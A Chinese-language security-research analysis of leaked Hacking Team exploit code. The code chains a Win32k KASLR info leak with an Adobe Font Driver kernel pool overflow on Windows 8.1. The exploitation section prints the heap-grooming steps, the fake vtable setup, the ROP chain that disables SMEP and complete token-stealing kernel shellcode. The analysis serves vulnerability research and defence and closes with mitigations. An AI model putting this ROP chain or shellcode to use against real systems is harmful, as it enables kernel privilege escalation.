# Hacking Team攻击代码分析Part5 Adobe Font Driver内核权限提升漏洞第二弹+Win32k KALSR绕过漏洞

作者：360Vulcan Team成员： MJ0011、pgboy

0x00 前言
=======

* * *

继360Vulcan上周分析了Hacking Team泄露信息中曝光的三个Flash漏洞和一个Adobe Font Driver内核漏洞后（链接见文后）。 Hacking Team泄露信息中仍在不断被发现存在新的攻击代码和0day漏洞。7月12日，Twitter上安全研究人员`@vlad902`公布了Hacking Team的邮件(`https://wikileaks.org/hackingteam/emails/emailid/974752`)中可能的一处Windows权限提升漏洞，并将其攻击代码上传到Github上（`https://github.com/vlad902/hacking-team-windows-kernel-lpe`)。

经过我们的分析，该攻击代码中包含了两个Windows内核模式驱动的0day漏洞，其中一个是针对Windows内核驱动Win32k.sys的一处安全特性（KASLR）的绕过漏洞，另一个是针对Adobe字体驱动(atmfd.dll)的一处内核池溢出引发的内核代码执行漏洞。

0x01 漏洞原理分析：
============

* * *

通过简单浏览攻击代码，我们知道攻击代码运用了一处`Win32k.sys`中的KASLR绕过漏洞获得Win32k的基地，并组织ROP链，同时，加载一个字体文件(font-data.bin)来利用字体驱动漏洞，触发ROP链，最终完成攻击。

0x02 Win32k.sys KASLR绕过漏洞
=========================

* * *

在Windows8.1以上的系统上，微软增强了针对KALSR的缓和能力，对于低完整性级别及以下的程序，禁止获得系统内核模块的地址信息，来缓和内核漏洞针对IE沙盒等安全机制的攻击。在360Vulcan Team 5月的博客《谈谈15年5月修复的三个0day》（`http://blogs.360.cn/blog/fixed_three_0days_in_may/`）中，我们比较详细地介绍了这类问题的的背景，以及一个和本次漏洞类似的`CNG.sys KASLR`绕过漏洞`CVE-2015-1674`。 这里Hacking Team所使用的是一个win32k处理字体信息时的栈未初始化导致的信息泄露漏洞。

我们结合源代码的`win32k_infoleak()`函数中可以了解， win32k用于获取文本字体信息的内核调用`NtGdiGetTextMetricsW->GreGetTextMetrics->bGetTextMetrics`会针对DC对象返回一个内部结构到存放`tagTEXTMETRIC`结构的输出缓存中。

通过分析`bGetTextMetrics`的实现我们可以得知，该函数首先检查字体对象中用于缓存`tagTEXTMETRIC`结构的一处指针是否为空，如果不为空，就直接使用这里保存的字体信息，这样可以加快频繁调用的`GetTextMetricsW`的性能。

如果缓存的结构为空，那么该函数会调用`bIFIMetricsToTextMetricW`来获取字体信息，并且使用PALLOCMEM2分配一块缓存结构内存，保存到字体对象中，以供下次查询加快速度。

这套逻辑在复制0x38偏移时，存在一处对齐引发的栈信息泄露问题，我们来看MSDN中对于tagTEXTMETRIC的定义（`https://msdn.microsoft.com/en-us/library/aa911401.aspx`），可以看到`0x38`偏移就是这个数据结构的最后一个成员`tmCharSet`，它的类型是BYTE，长度1个字节，而这里数据结构为了对齐，会补充7个字节，以便实现8字节对齐（x86系统上补充3个字节），就是这个数据结构对齐问题引发了这里的信息泄露。

在`bIFIMetricsToTextMetricW`函数中，会使用外部`bGetTextMetrics`提供的栈空间来保存获得的`tagTEXTMETRIC`结构，在存储前，函数并没有将栈中数据全部初始化，因此补齐的7个字节仍是其他函数遗留在栈空间中的，在后面复制到分配的用于缓存的堆内存中时，也将这部分数据一起复制了过去。

这就导致之前在栈中存放的其它函数的信息，被存入缓存的`tagTEXTMETRIC`结构中， 下次程序再通过`NtGdiGetTextMetricsW`获取时，就会获取到这些信息，如果栈中的信息恰好是内核地址信息，就会导致内核模块的信息泄露。

经过调试发现，目前最新补丁的`Windows8.1 x64`上，在首次调用并存储缓存结构时，这里的栈位置恰好存储了`win32k!SetOrCreateRectRgnIndirectPublic+0x42`函数的一处返回地址， 由于这里只有7个字节的地址信息，低8位会被修改为tmCharSet的数值（一般是0），因此最后通过`NtGdiGetTextMetricsW`获取的，会是再往上一点的`RGNOBJ::UpdateUserRgn`这个函数结尾处的垃圾对齐空间的位置。

这个漏洞显然远不如之前我们提到的`CNG.SYS`的泄露漏洞好用：

首先，栈上的信息可能因为调用路径或其他原因改变而不稳定，经过我们测试，这里的栈位置在某些调用路径下，并不是返回地址，而是其他的垃圾数据，这就会直接导致这个漏洞失效； 其次，Win32k的版本过多代码变动复杂，这个RGNOBJ::UpdateUserRgn的位置随时在变动，在低完整性级别下攻击代码还可以通过识别`win32k.sys`的版本做调整，在`AppContainers(EPM)`或Untrust级别下，就无法做到这点，只能硬猜，这也是为什么目前Github上的攻击代码不能在最新的全补丁`Windows 8.1 x64`上工作的原因：这个函数的位置发生了变动。

鉴于目前看到的这个攻击代码同上一个Hacking Team泄露的Windows内核权限提升漏洞的已经成熟“商用”的攻击代码不同，还只是出于演示目的的、存在很多硬编码的示例代码，因此很可能以后攻击代码的作者会使用更稳定、更好用的地址泄露漏洞来替换这个漏洞。毕竟，微软才刚刚意识到这类问题的严重性，内核中还存在很多类似的漏洞和问题。

＃0x03 Adobe Font Driver(atmfd.dll)内核池溢出漏洞

* * *

接下来我们来分析这个攻击代码中的重头戏：字体漏洞， 我们可以看到，在攻击代码中使用了AddFontMemResourceEx函数来加载了font-data.bin这个OTF字体文件，我们尝试在Windows 7系统上将这个文件改名为.otf文件（Explorer在渲染这个文件时也会加载它），系统立即蓝屏崩溃，但是在Windows8.1 x64系统上，则不会出现这个情况，是不是Windows 8.1中已经修补了这个漏洞？

我们再进一步验证，在Windows7系统上蓝屏崩溃时，我们看到蓝屏的代码是`0x19 BAD_POOL_HEADER`，看上去这似乎是一个Windows内核池的溢出漏洞，那么是不是在Windows 8.1上这个漏洞所溢出的内核池恰好没有被用到而导致不容易触发崩溃呢？

我们打开Driver Verifier工具，针对win32k.sys打开Speical Pool功能。关于驱动校验器的这个功能，可以参考微软MSDN的介绍：`https://msdn.microsoft.com/en-us/library/windows/hardware/ff551832(v=vs.85).aspx`，这个功能类似用户模式中的Page Heap功能，会将指定模块分配的Windows内核池放入特殊的内存位置，使得这类内核池的溢出在第一时间被发现，开启了这个功能后，我们如愿地在Windows 8.1 x64上100%触发这个漏洞的蓝屏崩溃。

我们可以看到这个崩溃的栈（这里是在桌面浏览字体文件触发，因此是`NtGdiAddFontResourceW`函数)

```
atmfd
….
win32k!atmfdLoadFontFile
win32k!PDEVOBJ::LoadFontFile
win32k!vLoadFontFileView
win32k!PUBLIC_PFTOBJ::bLoadFonts
win32k!GreAddFontResourceWInternal
win32k!NtGdiAddFontResourceW

```

这里可以看得很清楚，这是在win32k.sys驱动加载这个字体文件，在PUBLIC_PFTOBJ::bLoadFonts函数中，win32k.sys会将字体映射到内核中，进行一些字体对象的处理后，会调用这个字体对应的字体驱动，这里的这个adobe OTF字体最终就触发了atmfdLoadFontFile这个函数，这个函数atmfd.dll会输出的加载字体接口的封装，最后就进入atmfd.dll的代码中执行，实现最终的字体加载过程。

atmfd.dll是Adobe的代码编译的驱动，这里微软并没有给这个驱动提供符号文件，因此针对它的分析相对困难一些。我们通过分析代码的执行流程，结合内核调试和字体分析工具（如T2F Analyzer)，进一步深入分析atmfd.dll中的处理这个字体，最终触发漏洞的过程（以Windows 8.1 x64上最新补丁的atmfd.dll为例）：

1.  通过`win32k!atmfdLoadFontFile`进入atmfd中的`+0x13DE0`位置函数，我们称其为AtmfdLoadFont，这里是atmfd.dll中的加载字体接口，会识别字体的格式类型，填充相关的字体结构，并交给下面的进一步加载字体的函数来处理
2.  通过AtmfdLoadFont进入偏移`+0x178F0`的函数，我们称其为AtmfdLoadFontInternal，该函数进一步分析和处理字体的信息（如字体的文件时间），并通过EngMapFontFile等函数映射字体文件到内核，映射完成后，这个函数判断字体的类型为OTF，接着会进入一个专门处理OTF字体信息的函数中。
3.  通过AtmfdLoadFontFileInternal进入偏移`+0x17D55`的位置，我们称其为ProcessOTFFontInfo，该函数开始分析字体文件各个表的内容，接着我们看到有一个专门处理’GPOS‘这个表的FeatureList中标记为”kern”（kerning，用于处理字距)的FeatureTag的FeatureRecord的相关函数。
4.  进入这个专门处理”kern“的FeatureRecord的函数，偏移`+0x23128`,我们称其为ProcessKerningRecord。到了这个函数就进入了这里比较关键和复杂的细节。

这个函数会分析针对GPOS表的FeatureList，找到FreatureTag为”kern”的FeatureRecord，然后检查其FeatureTable的Lookups，找到有效的Lookups后，该函数开始分析每个Lookups的LookupTable，每个Lookups可以有多个LookupTable，其中每个LookupTable又可以有多个SubTable，根据不同的SubTable的PosFormat，函数会进行不同的处理，其中针对SubTable的PosFormat = 2的情况，会进入一个专门处理这个Format的函数

5.刚才说到当`PosFormat= 2`时会进入专门的处理SubTable函数，这里偏移是0x22A9C，我们称其为ProcessFormat2SubTable，这里也就是这个漏洞的本质原因的地方了，在这个函数中，会根据SubTable的Class1Count和Class2Count计算需要的长度，计算的方式是`0x20 * ClassXCount = 内存长度`，即0x20长度一个item，然后分配对应长度的内存，接着偏移0x21d08的函数（我们称其为CopyClassDefData)会调用将SubTable的ClassDef1和ClassDef2中的数据复制到这些内存中，同时，在这些内存的第一个item会复制到一个0x20字节的特殊数据。

这段逻辑的反编译代码如下：

```
01  Class1DefBuf = AllocMemory(32i64 * (unsigned int)Class1Count, v23, 1, 1);
02    if ( Class1DefBuf )
03    {
04      Class2DefBuf = AllocMemory(32i64 * Class2Count, v24, 1, 1);
05      if ( Class2DefBuf )
06      {
07        Class1DefSrc = *(_BYTE *)(SubTableObject + 9) | (unsigned __int16)(*(_WORD *)(SubTableObject + 8) << 8);
08        LODWORD(v50) = Class1Count;
09        v55 = CopyClassDefData(
10                SubTableObject,
11                Class1DefSrc,
12                TableEnd,
13                GlyphsCount,
14                (__int64)v50,
15                (__int64)arg_40,
16                FirstBuf,
17                Class1DefBuf);
18        if ( v55 == 1 )
19        {
20          v55 = 0;
21          Class2DefSrc = *(_BYTE *)(SubTableObject + 11) | (unsigned __int16)(*(_WORD *)(SubTableObject + 10) << 8);
22          v27 = Class2Count;
23          LODWORD(v50) = Class2Count;
24          v55 = CopyClassDefData(
25                  SubTableObject,
26                  Class2DefSrc,
27                  TableEnd,
28                  GlyphsCount,
29                  (__int64)v50,
30                  (__int64)arg_40,
31                  FirstBuf,
32                  Class2DefBuf);

```

其中,AllocateMemory（偏移`0x28080`)是对`win32k.sys`输出的`EngAllocMem`的一个封装，这也是为什么我们针对win32k.sys设置校验器也可以抓到atmfd的内核池溢出的原因：`atmfd.dll`最终的内存分配也是靠`win32k.sys(EngAllocMem)`实现的。

这里封装的`AllocateMemory`有一个特别的特性，也是造成这个漏洞可以触发的原因之一：分配内存的长度如果=0，这里并不会失败，因为这个封装中永远会将分配的内存长度+8，并将前面两个DWORD，8个字节分别填充为：长度 ， 和’ebdA'(Adobe的缩写tag)，将实际分配的内存位置+8 ，再返回给调用者。

也就是说， 当这里的AllocateMemory逻辑中， Class1Count或Class2Count等于0 ，要求分配0字节长度的内存时，这里并不会失败（函数逻辑检查了内存分配失败的情况），而是继续执行， 下面的CopyClassDefData函数实际获得的是一个有效长度为0的缓存。 这里代码编写者没有检查或处理Class1Count为0的情况，同时，AllocateMemory又掩盖了Class1Count为0的这个错误，让函数继续执行下去，这里是代码编写者所犯的第一个错误。

即使分配了错误长度的内存，如果后面的复制过程严格按照Class1Count来实现，这里也不会存在问题，但是这里代码编写者接着犯了第二个错误，如刚才上面所说，CopyClassDefData函数会给第一个ClassBuf的item复制一个item大小（0x20）的特殊数据。这里CopyClassDefData并没有检查Class1Count是否为0，就直接将数据复制到目标内存的第一个item的位置上，由于复制的大小超过了分配的大小，就自然造成了堆溢出，覆盖到内核池后面的数据。

我们使用`T2F Analyzer`可以看到这个漏洞字体的异常数据结构，首先使用`T2F Analyzer`打开存在漏洞的字体文件。

需要注意的是，`T2F Analyzer`在解析字体的过程后期还是会使用`AddFontResouceExA`来加载字体到内核，导致直接使用这个工具在没补丁的系统上打开漏洞字体文件会崩溃，这里简单使用调试器断下`AddFontResourceExA`，阻止加载字体文件就可以继续使用它的解析功能了。

首先，我们打开这个字体文件，找到`Advanced Typography Tables->GPOS Table`，打开FeatureList,可以看到FeatureTag是”kern”的FeatureRecord，这个FeatureRecord的`LookupCount = 1`，它的`LookupIndex = 1`

![enter image description here](http://drops.javaweb.org/uploads/images/71a93a915d88d1e55935da95903a4a9d02d45ce0.jpg)

我们打开LookupList，查看这个Index = 1的Lookup：

![enter image description here](http://drops.javaweb.org/uploads/images/679757124af2b3eab9ce95aa3a9ac126ff46c018.jpg)

正如我们前面推测的，这里的`Class1Count`就是=0 ， 也就是触发这个漏洞的根本原因。

0x04 漏洞利用
=========

* * *

介绍了Adobe Font Driver的这个内核池溢出漏洞，接下来我们就看看攻击代码是如何利用这个漏洞，最终实现内核代码执行，提升权限的。

在攻击代码中，作者利用了内核的堆风水技术，来确保这个内核池溢出最终覆盖到我们指定的对象。

首先，攻击代码中会分配大量的(5000个)`Accelerator Table`对象。这样做使其后面对象的在一段连续的内存。在Windows8 x64上，`Accelerator Table`对象的大小为0x28。 然后，攻击代码在刚才分配出来的`Accelerator Table`对象的中间靠后位置(3600-4600)进行释放。

在释放了这些`Accelerator Table`之后，会使用`CreateDCompositionHwndTarget`创建`CHwndTargetProp`对象。

`CHwndTargetProp`对象及其对应的分配、释放函数`CreateDCompositionHwndTarget/DestroyDCompositionHwndTarget`是微软从Windows8开始引入的一套针对窗口的”构图“对象管理函数，是Windows8以来微软新的UI系统的一部分，仅提供给一些内部的函数使用，我们在创建这些对象时，还需要创建对应的窗口对象。

作者精心选择`CHwndTargetProp`对象的原因是，它和Accelerator Table对象的大小一样，都是0x28字节，这样正好就将刚才释放的`Accelerator Table`的内存给占住。

接着，攻击代码再从刚才分配`CHwndTargetProp`对象的中间位置，释放指定个数，这样在`Accelerator Table`区域中 的`CHwndTargetProp`区域里， 再次制造内存空洞。

在加载字体的过程中， 分配小内存的`ClassDefBuf`时，就落入设置好的空洞中，接着内核池溢出，就会覆盖后面`CHwndTargetProp`的数据内容。

整个内核池的布局操控过程如下图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/57771eb7898759ae9b5848b10d12b322b58d4917.jpg)

由于Windows8以后微软已经移除了很多Win32k中的结构信息，因此`CHwndTargetProp`的数据结构只能通过猜测来分析，我们使用内核调试器分析一个`CHwndTargetProp`对象:

```
kd> dps fffff901443cdf40
fffff901`443cdf40 fffff960`00526d00 win32k!CHwndTargetProp::`vftable’
fffff901`443cdf48 fffff901`4082d9b0
fffff901`443cdf50 00000000`00000000
fffff901`443cdf58 ffffe001`2ed25d60
fffff901`443cdf60 00000000`00000000
fffff901`443cdf68 00000000`00000001

```

可以看到开头是一个虚表的地址，我们查看这个虚表的成员如下：

```
kd> dps fffff960`00526d00
fffff960`00526d00 fffff960`0031f470 win32k!CHwndTargetProp::Delete
fffff960`00526d08 fffff960`003b1378 win32k!CHwndTargetProp::GetAtom
fffff960`00526d10 48273f8a`8c7ed206
fffff960`00526d18 6cfcae1f`9eaeabb3

```

前面我们说到，加载字体过程中赋值内存可以覆盖后面的对象，因为我们已经经过了精心的堆布局，因此我们可以就可以覆盖特定的`CHwndTargetProp`的虚表，来实现将其虚表成员函数替换为我们想要执行的函数。 这里字体中覆盖的数据内容为固定的`0x0000000042005000`，那么通过在这个固定的内存位置构架假的虚表，我们就可以获得执行权限 我们可以看到，在攻击代码中，在固定位置（PAYLOAD_BASE)分配内存，并构建假的虚表的过程：

```
1   #define PAYLOAD_BASE 0x42000000
2    
3   *(ULONGLONG*)(PAYLOAD_BASE + 0x5000) = win32k_base_addr + 0x19fab; // pop rax # ret <-- RAX [win32k!CHwndTargetProp::Delete]
4   *(ULONGLONG*)(PAYLOAD_BASE + 0x5008) = win32k_base_addr + 0x6121; // xchg rax, rsp # ret (pivot) <-- this is where (1st) CALL jumps to. [win32k!CHwndTargetProp::GetAtom]

```

当`CHwndTargetProp`的虚表被覆盖后，攻击代码再调用`DestroyDCompositionHwndTarget`函数来释放`CHwndTargetProp`，此时最终调用到内核中，就会跳转到攻击代码已经设置好的虚表函数。

整个过程中，会先调用`win32k!CHwndTargetProp::GetAtom`然后再调用`win32k!CHwndTargetProp::Delete`。

总共过程中会有3次调用到`CHwndTargetProp`的虚表函数：

DestroyDCompositionHwndTarget过程：

第一次： win32k!CHwndTargetProp::GetAtom

第二次: win32k!CHwndTargetProp::Delete

DeatoryWindow过程：

第三次：`win32k!CHwndTargetProp::Delete`

为了绕过Windows8 系统的SMEP保护，这里虚表函数不能使用位于ring3的ShellCode，因此需要使用`win32k.sys`中的代码片段构建ROP，关闭SMEP， 这也就是为什么攻击代码中需要利用我们一开始说的win32k.sys的KASLR绕过漏洞： 为了构建这里所需要的ROP链。 整个构建ROP链的过程如下：

第一步：获取ntoskrnl的函数地址，这里是通过泄露的win32k.sys的地址，硬编码得到win32k.sys中对`ntoskrnl!ExAllocatePoolWithTag`的导入表的地址，然后操作ROP链读取函数地址：

```
1   *(ULONGLONG*)(PAYLOAD_BASE + 0x5010) = win32k_base_addr + 0x19fab;   // pop rax # ret  (RAX is source for our write)
2   *(ULONGLONG*)(PAYLOAD_BASE + 0x5018) = win32k_base_addr + 0x352220;  // pop into rax   (pointer to leaked address of `ntoskrnl!ExAllocatePoolWithTag` that win32k imports)
3   *(ULONGLONG*)(PAYLOAD_BASE + 0x5020) = win32k_base_addr + 0x98156;   // pop rcx # ret  (RCX is destination for our write)
4   *(ULONGLONG*)(PAYLOAD_BASE + 0x5028) = PAYLOAD_BASE + 0x100;         // pop into rcx   (memory to write leaked address)
5   *(ULONGLONG*)(PAYLOAD_BASE + 0x5030) = win32k_base_addr + 0xc432f;   // mov rax, [rax] # mov [rcx], rax # ret (write gadget to [RCX])

```

第二步：因为后面的流程还会调到虚表,必须先修复栈,让第二次调用函数正常返回。

```
01      *(ULONGLONG*)(PAYLOAD_BASE + 0x5038) = win32k_base_addr + 0x14db;    // pop rbx # ret
02       *(ULONGLONG*)(PAYLOAD_BASE + 0x5040) = PAYLOAD_BASE + 0x5100;        // this will clobber the existing vTable object pointer (RBX) ---------------------
03                                                                        //                                                                                |
04  // Setup the new fake vTable at 0x42005100. We don't do anything interesting                                                                            |
05  // with the second call. We just want it to return nicely.                                                                                              |
06       *(ULONGLONG*)(PAYLOAD_BASE + 0x5100) = PAYLOAD_BASE + 0x5110;        // double-dereference to get to gadget                          (actual ROP chain |
07       *(ULONGLONG*)(PAYLOAD_BASE + 0x5108) = PAYLOAD_BASE + 0x5110;        // (arbitrary pointer to pointer)                                 continues here) |
08       *(ULONGLONG*)(PAYLOAD_BASE + 0x5110) = win32k_base_addr + 0x6e314;   // (`RET` gadget)                                                                 |
09                                                                        //                                                                                |
10  // Resume execution. Restore original stack pointer.                                                                                                    |
11       *(ULONGLONG*)(PAYLOAD_BASE + 0x5048) = win32k_base_addr + 0x7018e;   // mov rax, r11 # ret (register holding a value close to original stack pointer) <-
12       *(ULONGLONG*)(PAYLOAD_BASE + 0x5050) = win32k_base_addr + 0x98156;   // pop rcx # ret
13       *(ULONGLONG*)(PAYLOAD_BASE + 0x5058) = 0x8;                          // pop into rcx
14       *(ULONGLONG*)(PAYLOAD_BASE + 0x5060) = win32k_base_addr + 0xee38f;   // add rax, rcx # ret (adjust the stack pointer)
15       *(ULONGLONG*)(PAYLOAD_BASE + 0x5068) = win32k_base_addr + 0x1f8c1;   // push rax # sub eax, 8b480020h # pop rsp # and al, 8 # mov rdi, qword ptr [rsp+10] # mov eax, edx # ret

```

第三步，根据`ntoskrnl!ExAllocatePoolWithTag`的地址硬编码计算出`ntoskrnl.exe`的基址

```
1   ExAllocatePoolWithTag_offset = 0x2a3a50;
2       nt_base_addr = *(ULONGLONG *)(PAYLOAD_BASE + 0x100) - ExAllocatePoolWithTag_offset;

```

第四步，找到ntoskrnl的基址，是为了利用其中操作cr4 SMEP位的代码，关闭SMEP，所以这步就是构建ROP链，关闭SMEP，这里的rop链是通过`DestroyWindow`触发的

```
01  *(ULONGLONG*)(PAYLOAD_BASE + 0x5000) = win32k_base_addr + 0x189a3a;  // xchg eax, esp # sbb al, 0 # mov eax, ebx # add rsp, 0x20 # pop rbx # ret
02      *(ULONGLONG *)(PAYLOAD_BASE + 0x5008) = 0x41414141;                   // filler
03      *(ULONGLONG *)(PAYLOAD_BASE + 0x5010) = 0x41414141;                   // filler
04      *(ULONGLONG *)(PAYLOAD_BASE + 0x5018) = 0x41414141;                   // filler
05      *(ULONGLONG *)(PAYLOAD_BASE + 0x5020) = 0x41414141;                   // filler
06      *(ULONGLONG*)(PAYLOAD_BASE + 0x5028) = win32k_base_addr + 0x19fab;   // pop rax # ret
07      *(ULONGLONG*)(PAYLOAD_BASE + 0x5030) = 0x406f8;                      // pop into rax, cr4 value
08      *(ULONGLONG*)(PAYLOAD_BASE + 0x5038) = nt_base_addr + 0x38a3cc;      // mov cr4, rax # add rsp, 0x28 # ret  (SMEP disabling gadget)
09      *(ULONGLONG *)(PAYLOAD_BASE + 0x5040) = 0x41414141;                   // filler
10      *(ULONGLONG *)(PAYLOAD_BASE + 0x5048) = 0x41414141;                   // filler
11      *(ULONGLONG *)(PAYLOAD_BASE + 0x5050) = 0x41414141;                   // filler
12      *(ULONGLONG *)(PAYLOAD_BASE + 0x5058) = 0x41414141;                   // filler
13      *(ULONGLONG *)(PAYLOAD_BASE + 0x5060) = 0x41414141;                   // filler

1   第五步，这里SMEP已经关闭，直接跳转到用户模式的ShellCode，并且真的去删除CHwndTargetProp对象
1   *(ULONGLONG*)(PAYLOAD_BASE + 0x5068) = PAYLOAD_BASE;                 // return to userland and win!
2   *(ULONGLONG*)(PAYLOAD_BASE + 0x5070) = win32k_base_addr + 0x165010;  // CHwndTargetProp::Delete(void)

```

第六步，最后执行用户模式ShellCode，这里就简单了，攻击代码中的ShellCode是一个简单的替换本进程token为winlogon的System Token的代码：

```
01  char sc[] = {
02      '\x4D', '\x8B', '\xBB', '\x68', '\x01', '\x00', '\x00',                                  // mov r15, [r11+0x168], save return address of kernel stack
03      '\x41', '\x51',                                                                          // push r9 save regs
04      '\x41', '\x52',                                                                          // push r10
05      '\x65', '\x4C', '\x8B', '\x0C', '\x25', '\x88', '\x01', '\x00', '\x00',                  // mov r9, gs:[0x188], get _ETHREAD from KPCR (PRCB @ 0x180 from KPCR, _ETHREAD @ 0x8 from PRCB)
06      '\x4D', '\x8B', '\x89', '\xB8', '\x00', '\x00', '\x00',                                  // mov r9, [r9+0xb8], get _EPROCESS from _ETHREAD
07      '\x4D', '\x89', '\xCA',                                                                  // mov r10, r9 save current eprocess
08      '\x4D', '\x8B', '\x89', '\x40', '\x02', '\x00', '\x00',                                  // mov r9, [r9+0x240] $a, get blink
09      '\x49', '\x81', '\xE9', '\x38', '\x02', '\x00', '\x00',                                  // sub r9, 0x238 => _KPROCESS
10      '\x41', '\x81', '\xB9', '\x38', '\x04', '\x00', '\x00', '\x77', '\x69', '\x6E', '\x6C',  // cmp [r9+0x438], 0x6c6e6977 does ImageName begin with 'winl' (winlogon)
11      '\x75', '\xe5',                                                                          // jnz $a no? then keep searching!
12      '\x4D', '\x8B', '\xA1', '\xE0', '\x02', '\x00', '\x00',                                  // mov r12, [r9+0x2e0] get pid
13      '\x48', '\xC7', '\xC0', '\x00', '\x10', '\x00', '\x42',                                  // mov rax, 0x42001000
14      '\x4C', '\x89', '\x20',                                                                  // mov [rax], r12 save pid for use later
15      '\x4D', '\x8B', '\x89', '\x48', '\x03', '\x00', '\x00',                                  // mov r9, [r9+0x348] get token
16                 '\x49', '\x83', '\xE1', '\xF0',                                                                                                                                         // and r9, 0xfffffffffffffff0 get SYSTEM token's address
17                 '\x49', '\x83', '\x41', '\xD0', '\x0A',                                                                                                                  // add [r9-0x30], 0x10 increment SYSTEM token's reference count by 0x10
18      '\x4D', '\x89', '\x8A', '\x48', '\x03', '\x00', '\x00',                                  // mov [r10+0x348], r9 replace our token with system token
19      '\x41', '\x5A',                                                                          // pop r10 restore regs
20      '\x41', '\x59',                                                                          // pop r9
21      '\x41', '\x53',                                                                          // push r11, pointer near to original stack
22      '\x5C',                                                                                  // pop rsp
23      '\x48', '\x81', '\xC4', '\x68', '\x01', '\x00', '\x00',                                  // add rsp, 0x168, restore original kernel rsp
24      '\x4C', '\x89', '\x3C', '\x24',                                                          // mov [rsp], r15, restore original return address
25      '\xFF', '\x24', '\x25', '\x70', '\x50', '\x00', '\x42',                                  // jmp [0x42005070], continue on to delete the object CHwndTargetProp::Delete(void)
26      0
27  };

```

0x05 漏洞缓解
=========

* * *

近期atmfd字体漏洞泛滥，建议禁用atmfd.dll （直接将其改名即可）。对于Windows 10用户，可以使用缓和策略阻止非信任字体加载，这个功能在今年1月我们介绍过（`http://blogs.360.cn/blog/windows10_font_security_mitigations/`），微软5月将其文档化：`https://msdn.microsoft.com/en-us/library/dn985836%28v=vs.85%29.aspx`